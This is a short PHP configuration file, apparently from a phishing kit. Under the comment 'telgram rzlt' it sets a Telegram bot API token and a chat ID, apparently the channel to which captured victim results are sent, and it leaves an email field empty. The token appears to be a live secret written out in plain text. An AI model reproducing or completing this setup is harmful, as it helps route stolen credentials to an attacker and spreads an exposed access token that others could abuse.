<?php


$email =""; 

//telgram rzlt
$api = "6931647132:AAHXwhs15B6FgHNdZ46YhJopNrntDhdYJdo";
$chatid = "-4126902548";


?>